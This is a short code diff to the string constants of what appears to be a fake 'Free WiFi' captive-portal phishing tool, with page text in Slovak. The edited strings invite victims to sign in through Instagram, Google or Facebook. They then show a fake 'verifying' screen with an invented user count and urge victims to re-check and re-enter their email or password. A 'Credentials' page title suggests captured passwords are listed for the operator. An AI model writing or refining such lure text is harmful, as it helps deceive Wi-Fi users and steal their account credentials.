@@ -23,9 +23,9 @@
 #define SSID_NAME "Free WiFi"
 #define SUBTITLE "Free WiFi service."
 #define TITLE "Prihlásenie"
-#define BODY "Je možné prihlásiť sa napríklad cez Instagam, Google, Facebook pre internetové pripojenie."
+#define BODY "Je možné prihlásiť sa napríklad cez Instagam, Google, Facebook pre internetové pripojenie.</br>Ak sa nedokážete pripojiť, skuste to znovu a skontrolujte Email alebo heslo"
 #define POST_TITLE "Overuje sa..."
-#define POST_BODY "Váše prihlásenie je v procese. Prosím, počkajte 1 minutu pre pripojenie .</br>Ďakujeme za trpezlivosť.</br>Pripojení ONLINE používatelia: 26</br>Stav: Zatial ste OFFLINE</b>Ak sa nedokážete pripojiť, skontrolujte vaše prihlasovacie údaje !>"
+#define POST_BODY "Váše prihlásenie je v procese. Prosím, počkajte 1 minutu pre pripojenie.</br>Ďakujeme za trpezlivosť.</br>Pripojení ONLINE používatelia: 26</br>Stav: Zatial ste OFFLINE</br>Ak sa nedokážete pripojiť, skontrolujte vaše prihlasovacie údaje>"
 #define PASS_TITLE "Credentials"
 #define CLEAR_TITLE "Cleared"
 
